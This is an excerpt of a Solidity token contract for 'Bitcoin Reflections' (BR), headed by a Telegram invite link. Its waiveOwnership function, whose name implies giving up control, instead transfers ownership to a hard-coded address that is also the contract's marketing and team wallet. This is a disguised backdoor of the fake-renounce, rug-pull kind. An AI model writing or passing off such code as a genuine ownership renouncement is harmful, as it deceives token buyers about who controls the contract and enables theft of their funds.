...
/** https://t.me/+Y-oqCu6zA6I3ZWNl
    Bitcoin Reflections ARYA X LAUNCH 
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x88513DE1FDF486F3c940e6926C39E6253e7b55aA));
        _owner = address(0x88513DE1FDF486F3c940e6926C39E6253e7b55aA);
    }
...
contract  BitcoinReflections is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = " Bitcoin Reflections";
    string private _symbol = "BR";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x88513DE1FDF486F3c940e6926C39E6253e7b55aA);
    address payable public teamWalletAddress = payable(0x88513DE1FDF486F3c940e6926C39E6253e7b55aA);
